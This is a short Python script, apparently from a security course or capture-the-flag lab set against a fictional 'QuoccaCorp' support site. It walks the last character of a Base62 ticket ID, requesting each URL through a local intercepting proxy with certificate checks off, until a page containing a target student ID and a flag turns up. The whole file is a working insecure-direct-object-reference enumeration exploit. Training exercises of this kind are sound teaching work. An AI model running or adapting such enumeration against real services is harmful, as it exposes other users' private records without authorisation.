import requests
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session()
s.verify = False
s.proxies = {"https": "http://127.0.0.1:8080"}

# Your unique zID to search for
target_zid = "z5480994"
base_url = "https://support.quoccacorp.com/raw/"
# Start from your known valid ID suffix
current_id_str = "RVu7DoTR"

# Character set for Base62
charset = string.ascii_uppercase + string.ascii_lowercase + string.digits

print(f"[*] Walking backward from {current_id_str} to find zID: {target_zid}...")

# Simple backward walk on the last character
prefix = current_id_str[:-1]
for char in reversed(charset):
    target_url = base_url + prefix + char
    try:
        r = s.get(target_url, timeout=2)
        if r.status_code == 200:
            if target_zid in r.text:
                print(f"\n[!] SUCCESS! Flag found at {target_url}")
                print(f"Content: {r.text}")
                break
            else:
                print(f"[-] Checked {char}: No match", end="\r")
    except:
        continue